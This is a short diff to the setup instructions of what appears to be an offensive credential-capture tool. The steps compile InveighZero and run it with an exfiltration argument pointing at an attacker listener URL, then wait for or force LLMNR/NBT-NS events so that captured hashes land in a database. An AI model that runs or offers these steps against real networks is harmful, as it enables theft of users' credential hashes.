@@ -18,7 +18,7 @@ Note: The process for setting up the client/server architecture for this tool is
 2. `cd AgentZero`
 3. `sudo docker-compose up --build`
 4. Compile the InveighZero-master binary that is packeged in the code.
-5. Drop this binary to disk or run as an assembly with the `-EXFILURL` argument: `InveighZero.exe -EXFILRUL http://[ip]:1776/listener
+5. Drop this binary to disk or run as an assembly with the `-EXFILURL` argument: `InveighZero.exe -EXFILRUL http://[ip]:1776/listener`
 6. Wait for (or force) an LLMNR/NBTNS event
 7. Captured hashes are stored in the dockerized DB.
 
